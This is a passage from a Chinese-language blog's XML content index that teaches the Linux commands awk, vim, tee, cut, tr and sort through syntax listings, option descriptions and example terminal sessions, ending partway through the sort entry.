    <content type="text"><![CDATA[Linux 命令- awk&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;awk 是一种处理文本文件的语言，是一个强大的文本分析工具。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之所以叫AWK是因为其取了三位创始人 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 的Family Name的首字符。 1. 命令格式12awk [选项参数] 'script' var=value file(s)awk [选项参数] -f script var=value file(s) 2. 命令参数 -F fs or –field-separator fs指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F:。 -v var=value or –asign var=value赋值一个用户定义变量。 -f scripfile or –file scriptfile从脚本文件中读取awk命令。 -mf nnn and -mr nnn对nnn值设置内在限制，-mf选项限制分配给nnn的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。 -W compact or –compat, -W traditional or –traditional在兼容模式下运行awk。所以gawk的行为和标准的awk完全一样，所有的awk扩展都被忽略。 -W copyleft or –copyleft, -W copyright or –copyright打印简短的版权信息。 -W help or –help, -W usage or –usage打印全部awk选项和每个选项的简短说明。 -W lint or –lint打印不能向传统unix平台移植的结构的警告。 -W lint-old or –lint-old打印关于不能向传统unix平台移植的结构的警告。 -W posix打开兼容模式。但有以下限制，不识别：/x、函数关键字、func、换码序列以及当fs是一个空格时，将新行作为一个域分隔符；操作符**和**=不能代替\^和^=；fflush无效。 -W re-interval or –re-inerval允许间隔正则表达式的使用，参考(grep中的Posix字符类)，如括号表达式[[:alpha:]]。 -W source program-text or –source program-text使用program-text作为源代码，可与-f命令混用。 -W version or –version打印bug报告信息的版本。 3. 基本用法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;log.txt 文本内容如下 12342 this is a test3 Are you like awkThis's a test10 There are orange,apple,mongo 用法一1awk '&#123;[pattern] action&#125;' &#123;filenames&#125; 实例：每行按空格或TAB分割，输出文本中的1、4行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# awk '&#123;print $1,$4&#125;' log.txt 2 a3 likeThis's 10 orange,apple,mongo[root@localhost ~]# awk '&#123;printf "%-8s %-10s\n",$1,$4&#125;' log.txt #格式化输出2 a 3 like This's 10 orange,apple,mongo 用法二1awk -F &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-F 相当于内置变量 FS ，指定分隔字符 实例：使用分隔符截取文档某段123456789101112131415[root@localhost ~]# awk -F, '&#123;print $1,$2&#125;' log.txt #使用“,”分割2 this is a test 3 Are you like awk This's a test 10 There are orange apple[root@localhost ~]# awk 'BEGIN&#123;FS=","&#125; &#123;print $1,$2&#125;' log.txt #使用内建变量2 this is a test 3 Are you like awk This's a test 10 There are orange apple[root@localhost ~]# awk -F '[ ,]' '&#123;print $1,$2,$5&#125;' log.txt #使用多个分隔符，先使用空格分割，然后对分割结果再使用“,”分割2 this test3 Are awkThis's a 10 There apple &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-F 选项的作用是指定分隔符，如果不加 -F 指定，则以空格或者 tab 为分隔符。print 为打印的动作，用来打印出某个字段。$1 为第一个字段，$2 为第二个字段，以此类推，有一个特殊的就是 $0 ，它表示整行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以使用自定义字符连接每个段，awk 的格式，-F 后紧跟单引号，然后里面为分隔符，print 的动作要用 {} 括起来，否则会报错。print 还可以打印自定义的内容，但是自定义的内容要用双引号括起来。 用法三1awk -v &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-v 设置变量 实例：12345678910[root@localhost ~]# awk -v a=1 '&#123;print $1,$1+a&#125;' log.txt2 33 4This's 110 11[root@localhost ~]# awk -v a=1 -v b=a '&#123;print $1,$1+a,$1b&#125;' log.txt2 3 2a3 4 3aThis's 1 This'sa10 11 10a 用法四1awk -f &#123;awk脚本&#125; [文件名] 实例1awk -f cal.awk log.txt 运算符 运算符 描述 = += -= = /= %= ^= *= 赋值 ?: C条件表达式 \ \ 逻辑或 &amp;&amp; 逻辑与 ~ ~! 匹配正则表达式和不匹配正则表达式 &lt; &lt;= &gt; &gt;= != == 关系运算符 空格 连接 + - 加，减 * / % 乘，除与求余 + - ! 一元加，减和逻辑非 ^ * 求幂 ++ – 增加或减少，作为前缀或后缀 $ 字段引用 in 数组成员 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;过滤第一列大于2的行 1234[root@localhost ~]# awk '$1&gt;2' log.txt3 Are you like awkThis's a test10 There are orange,apple,mongo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;过滤第一列等于2的行 12[root@localhost ~]# awk '$1==2 &#123;print $1,$3&#125;' log.txt2 is &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;过滤第一列大于2并且第二列等于 ‘Are’的行 12[root@localhost ~]# awk '$1&gt;2 &amp;&amp; $2=="Are" &#123;print $1,$2,$3&#125;' log.txt3 Are you 内建变量 变量 描述 \$n 当前记录的第n个字段，字段间由FS分割 \$0 完整的输入记录 ARGC 命令行参数的数目 ARGIND 命令行中当前文件的位置（从0开始算） ARGV 包含命令行参数的数组 CONVFMT 数字转换格式（默认值为%.6g）ENVIRON环境变量关联数组 ERRNO 最后一个系统错误的描述 FIELDWIDTHS 字段宽度列表（用空格键分割） FILENAME 当前文件名 FNR 个文件分别计数的行号 FS 字段分割符（默认是任何空格） IGNORECASE 如果为真，则进行忽略大小写的匹配 NF 输入字段的分隔符 NR 已经读出的记录数，就是行号，从1开始 OFMT 数字的输出格式（默认值是%.6g） OFS 输出记录分隔符（输出换行符），输出时用指定的符号代替换行符 ORS 输出记录分隔符（默认值是一个换行符） RLENGTH 由 match 函数所匹配的字符串的长度 RS 记录分隔符（默认是一个换行符） RSTART 由 match 函数所匹配的字符串的第一个位置 SUBSEP 数组下标分隔符（默认值是/034） 12345678910111213141516171819202122232425262728$ awk 'BEGIN&#123;printf "%4s %4s %4s %4s %4s %4s %4s %4s %4s\n","FILENAME","ARGC","FNR","FS","NF","NR","OFS","ORS","RS";printf "---------------------------------------------\n"&#125; &#123;printf "%4s %4s %4s %4s %4s %4s %4s %4s %4s\n",FILENAME,ARGC,FNR,FS,NF,NR,OFS,ORS,RS&#125;' log.txtFILENAME ARGC FNR FS NF NR OFS ORS RS---------------------------------------------log.txt 2 1 5 1log.txt 2 2 5 2log.txt 2 3 3 3log.txt 2 4 4 4$ awk -F\' 'BEGIN&#123;printf "%4s %4s %4s %4s %4s %4s %4s %4s %4s\n","FILENAME","ARGC","FNR","FS","NF","NR","OFS","ORS","RS";printf "---------------------------------------------\n"&#125; &#123;printf "%4s %4s %4s %4s %4s %4s %4s %4s %4s\n",FILENAME,ARGC,FNR,FS,NF,NR,OFS,ORS,RS&#125;' log.txtFILENAME ARGC FNR FS NF NR OFS ORS RS---------------------------------------------log.txt 2 1 ' 1 1log.txt 2 2 ' 1 2log.txt 2 3 ' 2 3log.txt 2 4 ' 1 4# 输出顺序号 NR, 匹配文本行号$ awk '&#123;print NR,FNR,$1,$2,$3&#125;' log.txt---------------------------------------------1 1 2 this is2 2 3 Are you3 3 This's a test4 4 10 There are# 指定输出分割符$ awk '&#123;print $1,$2,$5&#125;' OFS=" $ " log.txt---------------------------------------------2 $ this $ test3 $ Are $ awkThis's $ a $10 $ There $ 使用正则，字符串匹配&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出第二列包含 “th”，并打印第二列与第四列 12[root@localhost ~]# awk '$2 ~ /th/ &#123;print $2,$4&#125;' log.txtthis a &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ~ 表示模式开始。//中是模式。 123[root@localhost ~]# awk '/re/' log.txt3 Are you like awk10 There are orange,apple,mongo 忽略大小写123[root@localhost ~]# awk 'BEGIN&#123;IGNORECASE=1&#125; /this/' log.txt2 this is a testThis's a test 模式取反12345678[root@localhost ~]# awk '$2 !~ /th/ &#123;print $2,$4&#125;' log.txtAre likea There orange,apple,mongo[root@localhost ~]# awk '! /th/ &#123;print $2,$4&#125;' log.txtAre likea There orange,apple,mongo awk 脚本&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于 awk 脚本，需要注意两个关键词 BEGIN 和 END。 BEGIN {这里面放的是执行前的语句｝ END ｛这里面放的是处理完所有的行后要执行的语句｝ ｛这里面放的是处理每一行时要执行的语句｝ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假设有这么一个文件（学生成绩表） 123456[root@localhost ~]# cat score.txt Marry 2143 78 84 77Jack 2321 66 78 45Tom 2122 48 77 71Mike 2537 87 97 95Bob 2415 40 57 62 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;awk 脚本如下 123456789101112131415161718192021222324[root@localhost ~]# cat cal.awk#!/bin/awk -f#运行前BEGIN &#123; math = 0 english = 0 computer = 0 printf "NAME NO. MATH ENGLISH COMPUTER TOTAL\n" printf "---------------------------------------------\n"&#125;#运行中&#123; math+=$3 english+=$4 computer+=$5 printf "%-6s %-6s %4d %8d %8d %8d\n", $1, $2, $3,$4,$5, $3+$4+$5&#125;#运行后END &#123; printf "---------------------------------------------\n" printf " TOTAL:%10d %8d %8d \n", math, english, computer printf "AVERAGE:%10.2f %8.2f %8.2f\n", math/NR, english/NR, computer/NR&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行结果 1234567891011[root@localhost ~]# awk -f cal.awk score.txtNAME NO. MATH ENGLISH COMPUTER TOTAL---------------------------------------------Marry 2143 78 84 77 239Jack 2321 66 78 45 189Tom 2122 48 77 71 196Mike 2537 87 97 95 279Bob 2415 40 57 62 159--------------------------------------------- TOTAL: 319 393 350 AVERAGE: 63.80 78.60 70.00 另外一些实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;awk 的 hello world 程序为： 1BEGIN &#123;print "Hello, world!"&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;计算文件大小 12[root@localhost ~]# ls -l *.txt | awk '&#123;sum+=$6&#125; END &#123;print sum&#125;'30 &#160;&#160;&#160;&#160;&#160;&#160;&#160;从文件中找出长度大于80的行 1awk 'lenght&gt;80' log.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;打印九九乘法表 1seq 9 | sed 'H;g' | awk -v RS='' '&#123;for(i=1;i&lt;=NF;i++)printf("%dx%d=%d%s", i, NR, i*NR, i==NR?"\n":"\t")&#125;']]></content>
      <tags>
        <tag>正则表达式</tag>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- vim]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F72.%20Linux%20%E5%91%BD%E4%BB%A4-vim%2F</url>
    <content type="text"><![CDATA[Linux 命令- vim&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所有的 Unix Like 系统都会内建 vi 文书编辑器，其他的文书编辑器则不一定存在。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是目前使用比较多的是 vim 编辑器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vim 具有程序编辑的能力，可以主动的以字体颜色辨别语法的正确性，方便设计。 什么是vim&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Vim 是从 vi 发展出来的一个文本编辑器。代码补完、编辑及错误跳转等方便编程的功能特别丰富，在程序员中广泛使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;简单的来说，vi 是老式的字处理器，不公功能已经很齐全。vim 则可以说是程序开发者的一向很好用的工具。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;连vim官方网站自己也说 vim 是一个程序开发工具而不是文字处理软件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vim 键盘图 vim的使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基本上 vim 分为三种模式：命令模式（Command mode、编辑模式）、输入模式（Insert mode）和底线命令模式（Last line mode、末行模式）。三种模式的作用分别是： 命令模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户刚刚启动 vim ，便计入了命令模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此状态下敲击键盘动作会被 vim 识别为命令，而非输入字符。比如此时按 i ，并不回输入一个字符，i 被当作了一个命令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下是常用的几个命令： i 在当前光标所在字符的前面，转为输入模式； a 在当前光标所在字符的后面，转为输入模式； o 在当前光标所在行的下方，新建一行，并转为输入模式； I 在当前光标表所在行的行首，转为输入模式； A 在当前光标所在行的行尾，转为输入模式； O 在当前光标所在行的上方，新建一行，并转为输入模式； x 删除当前光标所在出的字符； ： 切换到底线命令模式，以在最底一行输入命令； ESC 从输入模式切换为命令模式，也可是底线命令模式切换为命令模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：输入模式和底线命令模式之间不能直接切换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若想要编辑文本：启动 vim ，进入了命令模式，按下 i ，切换到输入模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。 输入模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在命令模式下按下 i 就进入了输入模式。在输入模式中，可以使用以下按键： 字符按键以及Shift组合，输入字符 ENTER，回车键，换行 BACK SPACE，退格键，删除光标前一个字符 DEL，删除键，删除光标后一个字符 方向键，在文本中移动光标 HOME/END,移动光标到行首/行尾 Page Up/Page Down，上/下翻页 Insert，切换光标为输入/替换模式，光标将变成竖线/下划线 ESC，退出输入模式，切换到命令模式 底线命令模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在命令模式下按下 :（英文冒号）就进入了底线命令模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在底线命令模式中，基本的命令有： q退出程序 w保存文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按ESC键可随时退出底线命令模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以将这三个模式想成下图来表示： vim 使用实例使用 vim 进入命令模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 vim 来建立一个名为 test.txt 的文件 1# vim test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;直接输入 vim文件名就能进入 vim 的命令模式了。vim 后面一定要加文件名，不管该文件存在与否。 按 i 进入输入模式（也称为编辑模式），开始编辑文字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在命令模式中，只要按下 i、o、a 等字符就可以进入输入模式了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在编辑模式当中，可以发现在左下角状态栏中会出现 -INSERT-的字样，那就是可以输入任意字符的提示。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个时候，键盘上除了ESC这个键之外，其他的按键都可以视作为一般的输入按钮了，所以可以进行任意的编辑。 按下ESC按键回到一般模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果编辑完毕，就按下ESC这个按键即可马上回到命令模式，这是左下角的 -INSERT-不见了 在命令模式中，按下:wq保存后退出 vim&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存并退出的指令很简单，输入:wq即可保存并退出。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就成功创建了一个 test.txt文件。 vim 按键说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了以上简易范例的 i、ESC、:wq 之外，其实 vim 还有非常多的按键可以使用。 第一部分：命令模式可用的光标移动、复制粘贴、搜索替换等 第二部分：命令模式切换到编辑模式的可以用按键说明 第三部分：命令模式切换到末行指令模式的可以用按键说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;特别注意，在 vim 中，数字是很有意义的！数字通常代表重复做几次的意思！也有可能是代表去到第几个的意思。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;举例来说，要删除50行，则是用50dd，数字加在动作之前；要向下移动20行，20j或是20↓即可。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- tee]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F67.%20Linux%20%E5%91%BD%E4%BB%A4-%20tee%2F</url>
    <content type="text"><![CDATA[Linux 命令- tee&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tee 命令用于读取标准输入的数据，并将其内容输出成文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tee 指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。 1. 命令语法1tee [参数] [文件] 2. 命令参数 -a或–append 附加到既有文件的后面，而非覆盖它． -i或–ignore-interrupts 忽略中断信号。 –help 在线帮助。 –version 显示版本信息。 使用实例实例1：使用指令 tee 将用户输入的数据同时保存到文件 file1 和 file2 中&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tee file1 file2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# tee file1 file2my linuxmy linux^C[root@localhost ~]# cat file1 my linux[root@localhost ~]# cat file2 my linux &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以使用管道符执行 123456[root@localhost ~]# echo 'my linux'|tee file1 file2my linux[root@localhost ~]# cat file1my linux[root@localhost ~]# cat file2my linux]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- cut]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F64.%20Linux%20%E5%91%BD%E4%BB%A4-%20cut%2F</url>
    <content type="text"><![CDATA[Linux 命令- cut&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cut命令用来显示行中的指定部分，删除文件中指定字段。cut经常用来显示文件的内容，类似于下的type命令。 1. 命令格式1cut [参数] [file] 2. 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不指定 File 参数，cut 命令将读取标准输入。必须指定 -b、-c 或 -f 标志之一。 3. 命令参数 -b：仅显示行中指定直接范围的内容； -c：仅显示行中指定范围的字符； -d：指定字段的分隔符，默认的字段分隔符为“TAB”； -f：显示指定字段的内容； -n：与“-b”选项连用，不分割多字节字符； –complement：补足被选择的字节、字符或字段； –out-delimiter=&lt;字段分隔符&gt;：指定输出内容是的字段分割符； –help：显示指令的帮助信息 –version：显示指令的版本信息。 4. 使用实例实例1：截取文件其中一个字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cut -c2 /etc/passwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cut -c2 /etc/passwdoiadpyhaapatoyybososh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;提取第2个字符 实例2：截取文件多个字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cut -c2-5,10 /etc/passwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cut -c2-5,10 /etc/passwdoot:0in:x:aemo2dm:x:p:x:lync:0hutdxalt:0ail:1peraxames2tp:x5obod9ysteuysteebus::olki:ss:x5ostf:shd::hron9 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;提取第2、第3、第4、第5和第10个字符 实例3：提取前4个字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cut -c-4 /etc/passwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cut -c-4 /etc/passwdrootbin:daemadm:lp:xsyncshuthaltmailopergameftp:nobosystsystdbuspolktss:postsshdchro 实例4：打印从第10个字符开始到结尾&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cut -c10- /etc/passwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cut -c5- /etc/passwd:x:0:0:root:/root:/bin/bashx:1:1:bin:/bin:/sbin/nologinon:x:2:2:daemon:/sbin:/sbin/nologinx:3:4:adm:/var/adm:/sbin/nologin:4:7:lp:/var/spool/lpd:/sbin/nologin:x:5:0:sync:/sbin:/bin/syncdown:x:6:0:shutdown:/sbin:/sbin/shutdown:x:7:0:halt:/sbin:/sbin/halt:x:8:12:mail:/var/spool/mail:/sbin/nologinator:x:11:0:operator:/root:/sbin/nologins:x:12:100:games:/usr/games:/sbin/nologinx:14:50:FTP User:/var/ftp:/sbin/nologindy:x:99:99:Nobody:/:/sbin/nologinemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologinemd-network:x:192:192:systemd Network Management:/:/sbin/nologin:x:81:81:System message bus:/:/sbin/nologinitd:x:998:996:User for polkitd:/:/sbin/nologinx:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinfix:x:89:89::/var/spool/postfix:/sbin/nologin:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinny:x:997:995::/var/lib/chrony:/sbin/nologin 实例5：用 -f 提取指定字段，-d 指定分隔符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12cut -f1 -d" " test.txtcut -f2,3 -d" " test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost ~]# cat test.txtNo Name Mark Percent01 tom 69 9102 jack 71 8703 alex 68 98[root@localhost ~]# cut -f1 -d" " test.txtNo010203[root@localhost ~]# cut -f2,3 -d" " test.txtName Marktom 69jack 71alex 68 实例6：使用 –complement 提取指定字段之外的列&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cut -f2 -d" " --complement test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# cat test.txt No Name Mark Percent01 tom 69 9102 jack 71 8703 alex 68 98[root@localhost ~]# cut -f2 -d" " --complement test.txtNo Mark Percent01 69 9102 71 8703 68 98]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- tr]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F68.%20Linux%20%E5%91%BD%E4%BB%A4-%20tr%2F</url>
    <content type="text"><![CDATA[Linux 命令- tr&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tr 命令用户转换或删除文件中的字符。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tr 指令从标准输入设备读取数据，经过字符串转以后，将结果输出到标准输出设备。 1. 命令语法12tr [参数] [第一字符集] [第二字符集]tr [OPTION] [SET1] [SET2] 2. 命令参数 -c, –complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换 -d, –delete：删除指令字符 -s, –squeeze-repeats：缩减连续重复的字符成指定的单个字符 -t, –truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等 –help：显示程序用法信息 –version：显示程序本身的版本信息 字符集合的范围： \NNN 八进制值的字符 NNN (1 to 3 为八进制值的字符) \\ 反斜杠 \a Ctrl-G 铃声 \b Ctrl-H 退格符 \f Ctrl-L 走行换页 \n Ctrl-J 新行 \r Ctrl-M 回车 \t Ctrl-I tab键 \v Ctrl-X 水平制表符 CHAR1-CHAR2 ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。 [CHAR*] ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 相同长度为止 [CHAR*REPEAT] ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止(REPEAT 的数字采 8 进位制计算，以 0 为开始) [:alnum:] ：所有字母字符与数字 [:alpha:] ：所有字母字符 [:blank:] ：所有水平空格 [:cntrl:] ：所有控制字符 [:digit:] ：所有数字 [:graph:] ：所有可打印的字符(不包含空格符) [:lower:] ：所有小写字母 [:print:] ：所有可打印的字符(包含空格符) [:punct:] ：所有标点字符 [:space:] ：所有水平与垂直空格符 [:upper:] ：所有大写字母 [:xdigit:] ：所有 16 进位制的数字 [=CHAR=] ：所有符合指定的字符(等号里的 CHAR，代表你可自订的字符) 使用实例实例1：将文件testfile 中的小写字母全部转换成大写字母&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat testfile|tr a-z A-Z &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122$ cat testfile #testfile原来的内容 Linux networks are becoming more and more common, but scurity is often an overlooked issue. Unfortunately, in today’s environment all networks are potential hacker targets, fro0m tp-secret military research networks to small home LANs. Linux Network Securty focuses on securing Linux in a networked environment, where the security of the entire network needs to be consideredrather than just isolated machines. It uses a mix of theory and practicl techniques to teach administrators how to install and use security applications, as well as how the applcations work and why they are necesary. $ cat testfile | tr a-z A-Z #转换后的输出 LINUX NETWORKS ARE BECOMING MORE AND MORE COMMON, BUT SCURITY IS OFTEN AN OVERLOOKED ISSUE. UNFORTUNATELY, IN TODAY’S ENVIRONMENT ALL NETWORKS ARE POTENTIAL HACKER TARGETS, FROM TP-SECRET MILITARY RESEARCH NETWORKS TO SMALL HOME LANS. LINUX NETWORK SECURTY FOCUSES ON SECURING LINUX IN A NETWORKED ENVIRONMENT, WHERE THE SECURITY OF THE ENTIRE NETWORK NEEDS TO BE CONSIDERED RATHER THAN JUST ISOLATED MACHINES. IT USES A MIX OF THEORY AND PRACTICL TECHNIQUES TO TEACH ADMINISTRATORS HOW TO INSTALL AND USE SECURITY APPLICATIONS, AS WELL AS HOW THE APPLCATIONS WORK AND WHY THEY ARE NECESARY. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以使用 [:lower:] [:upper:] 参数来实现 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat testfile|tr [:lower:] [:upper:] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678$ cat testfile | tr [:lower:] [:upper:] #转换后的输出 LINUX NETWORKS ARE BECOMING MORE AND MORE COMMON, BUT SCURITY IS OFTEN AN OVERLOOKED ISSUE. UNFORTUNATELY, IN TODAY’S ENVIRONMENT ALL NETWORKS ARE POTENTIAL HACKER TARGETS, FROM TP-SECRET MILITARY RESEARCH NETWORKS TO SMALL HOME LANS. LINUX NETWORK SECURTY FOCUSES ON SECURING LINUX IN A NETWORKED ENVIRONMENT, WHERE THE SECURITY OF THE ENTIRE NETWORK NEEDS TO BE CONSIDERED RATHER THAN JUST ISOLATED MACHINES. IT USES A MIX OF THEORY AND PRACTICL TECHNIQUES TO TEACH ADMINISTRATORS HOW TO INSTALL AND USE SECURITY APPLICATIONS, AS WELL AS HOW THE APPLCATIONS WORK AND WHY THEY ARE NECESARY. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不过替换、删除、以及去重复都是针对一个字符来讲的，哟一定局限性。如果是针对一个字符串就不再管用了]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- sort]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F65.%20Linux%20%E5%91%BD%E4%BB%A4-%20sort%2F</url>
    <content type="text"><![CDATA[Linux 命令- sort&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sort 命令在 linux 里非常有用，它将文件进行排序，并将排序结果标准输出。 1. 命令语法1sort [参数] [文件] 2. 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用作排序 3. 命令参数 -b 忽略每行前面开始出的空格字符。 -d 排序时，处理英文字母、数字及空格字符外，忽略其他的字符。 -f 排序时，将小写字母视为大写字母。 -i 排序时，除了040至176之间的ASCII字符外，忽略其他的字符。 -c 检查文件是否已经按照顺序排序。 -m 将几个排序好的文件进行合并。 -M 前面3个字母依照月份的缩写进行排序。 -n 依照数值的大小排序。 -o&lt;输出文件&gt; 将排序后的结果存入指定的文件。 -r 以相反的顺序来排序。 -t&lt;分隔字符&gt; 指定排序时所用的栏位分隔字符。 -k 指定域 –help 显示帮助。 –version 显示版本信息。 使用实例实例1：对 /etc/passwd 的帐号进行排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat /etc/passwd|sort &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cat /etc/passwd|sortadm:x:3:4:adm:/var/adm:/sbin/nologinbin:x:1:1:bin:/bin:/sbin/nologinchrony:x:997:995::/var/lib/chrony:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinftp:x:14:50:FTP 